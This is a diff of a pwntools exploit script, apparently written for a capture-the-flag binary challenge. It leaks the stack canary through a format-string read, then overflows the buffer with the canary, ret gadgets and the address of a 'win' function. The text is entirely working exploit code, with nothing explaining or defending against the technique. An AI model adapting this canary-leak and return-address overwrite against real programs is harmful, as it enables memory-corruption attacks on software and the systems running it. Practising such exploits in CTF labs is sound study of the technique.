@@ -21,6 +21,7 @@ def initialize(argv=[]):
 
 gdbscript = '''
 init-pwndbg
+break win
 '''.format(**locals())
 
 # =========================================================
@@ -30,7 +31,8 @@ def exploit():
     global io
     io = initialize()
     rop = ROP(exe)
-
+    
+    nop_ret = 0x040112f
     # 31$p canary    
     io.sendlineafter(b'>', b'Yes')
     io.sendline(b'%31$p')
@@ -40,13 +42,11 @@ def exploit():
     success('Canary %#x', canary)
 
     offset = 8
-    payload = flat({
-        offset: [
-            canary,
-            rop.ret.address,
-            b'AAAAAAAA'
-        ]
-    })
+    payload = b'\x00' * 8
+    payload += p64(canary)
+    payload += p64(nop_ret)
+    payload += p64(nop_ret)
+    payload += p64(elf.sym['win'])
 
     io.sendline(payload)
     io.sendline(b'No')
